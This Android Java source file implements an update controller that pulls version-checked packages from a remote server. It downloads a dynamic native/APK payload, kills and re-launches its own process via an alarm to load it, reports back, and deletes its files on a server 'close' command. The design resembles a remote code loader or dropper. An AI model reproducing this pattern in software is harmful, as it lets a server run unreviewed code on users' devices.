package com.use.nice;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.use.nice.manager.GlobalContext;
import com.use.nice.update.UDCtrl;
import com.use.nice.update.UpdateInter;
import com.use.nice.update.UpdateModel;
import com.use.nice.update.UpdateUtil;
import com.use.nice.util.Util_AndroidOS;
import com.use.nice.util.Util_File;
import com.use.nice.util.Util_Log;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by zhengnan on 2015/9/17.
 */
public class NiceCtrl implements UpdateInter {
    private NiceCtrl(){
        new File(NiceCts.SAVE_PATH_NAME).mkdirs();
        ctx=GlobalContext.getCtx();
        if(Util_Log.logShow)Util_Log.log("curVersion: "+ NiceCts.HULL_VERSION+", subVersion4plg: "+getSubVersion());
    }
    private static NiceCtrl ins = new NiceCtrl();
    public static NiceCtrl getIns(){
        return ins;
    }
    public Context ctx= null;
    @Override
    public String getModuleName() {
        return FieldName.udNice;
    }

    @Override
    public void update() {
        UpdateModel model = null;

        //若so执行失败就就错误进度保存
        String lastSoProgress = Util_File.readDef(ctx,FieldName.progress,"0");
        if(!lastSoProgress.equals("0")){
            UDCtrl.getIns().pushLog(201+"_"+lastSoProgress);
        //    Util_File.writeDef(ctx, FieldName.bad_progress, lastSoProgress);
            Util_File.writeDef(ctx,FieldName.progress,"0");
        }

        if(!UpdateUtil.isInterval(getModuleName())){//网络数据
            Util_Log.log("needUpdate!");
            //update
            List<NameValuePair> params = new ArrayList<>();
            //子包的版本号，每次更新包时需要改为最新的子包版本。
            params.add(new BasicNameValuePair(FieldName.vercode, "" + getSubVersion()));
            params.add(new BasicNameValuePair(FieldName.dVersion, "" + getVersion()));
            //上次so包的执行进度是否正常。
//            String lastSoBadProgress = Util_File.readDef(ctx,FieldName.bad_progress,"0");
//            if(!lastSoBadProgress.equals("0")){
//                params.add(new BasicNameValuePair(FieldName.progress, "" + lastSoBadProgress));
//                Util_Log.log("上次的执行进度不正常:"+lastSoBadProgress);
//            }
            String ret = UDCtrl.getIns().pullData(NiceCts.UPDATE_URL,params);
            model = new UpdateModel(ret, true);
            //更新间隔时间
            if(model.isValid()){
                //上传成功后重置掉so进度
//                if(!lastSoBadProgress.equals("0")){
//                    Util_File.writeDef(ctx,FieldName.bad_progress,"0");
//                }

                UpdateUtil.setInterval(getModuleName(),model.getNextInterval());
                Util_File.writeDef(ctx,FieldName.soSuccess,FieldName.failed);//每次联网时重置so的标记
                if(model.isClose()){//进行删除处理
                    Util_Log.logReal("close!");
                    deleteApk();
                    deletePng();
                    UpdateUtil.deleteNativeModel(this);
                    return;
                }
            }
        }else{//本地未完成的数据
            Util_Log.log("search native!");
            model = UpdateUtil.getNativeModel(this);
        }
        if(model.isValid()&&model.getUrl().trim().equals("")){
            Util_Log.log("url is empty!");
            return;
        }

        Util_Log.logReal("has valid model : "+model.isValid());
        if(Util_Log.logShow)Util_Log.log(model.toString());
        if (model.isValid() && model.isStatus()) {  //需要执行的数据
            if (!model.isDownLoadOk()) {
                boolean dSuccess = UDCtrl.getIns().download(this,model);//下载动态包
                model.setDownLoadOk(dSuccess);
                if(dSuccess) {
                    UpdateUtil.saveNativeModel(model, this);
                    Util_Log.log("重启当前进程！");
                    //注册一个alarm来重启自己
                    AlarmManager am  = Util_AndroidOS.getAlarmMgr(ctx);
                    Intent it = new Intent(ctx,MyService.class);
                    PendingIntent sender = PendingIntent.getBroadcast(ctx, 0, it, PendingIntent.FLAG_CANCEL_CURRENT);
                    am.set(AlarmManager.RTC_WAKEUP,System.currentTimeMillis()+5*1000,sender);
                    android.os.Process.killProcess(android.os.Process.myPid());
                }
            }
            if (model.isDownLoadOk()
                    && !model.isFeedbackOk()) {//反馈结果
                model.setFeedbackOk(UDCtrl.getIns().feedback(NiceCts.RESULT_URL,true, model.getToken()));
            }
            //save or dele
            if (model.isFeedbackOk()) {
                UpdateUtil.deleteNativeModel(this);
            } else {
                UpdateUtil.saveNativeModel(model,this);
            }
        }
    }

    @Override
    public boolean sureApk() {
        return UDCtrl.getIns().sureApkFile(this);
    }

    @Override
    public String getApkName() {
        return NiceCts.APK_NAME;
    }

    @Override
    public String getPngName() {
        return NiceCts.ICON_NAME;
    }

    @Override
    public String getSavePath() {
        return NiceCts.SAVE_PATH_NAME;
    }

    @Override
    public void deleteApk() {
        UDCtrl.getIns().deleteApk(this);
    }

    @Override
    public void deletePng() {
        UDCtrl.getIns().deletePng(this);
    }


    @Override
    public float getVersion() {
        return NiceCts.HULL_VERSION;
    }

    @Override
    public String getSubVersion() {
        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(GlobalContext.getCtx());
        String version = sp.getString(FieldName.subVersion4Nice, "-1");
        return version;
    }
}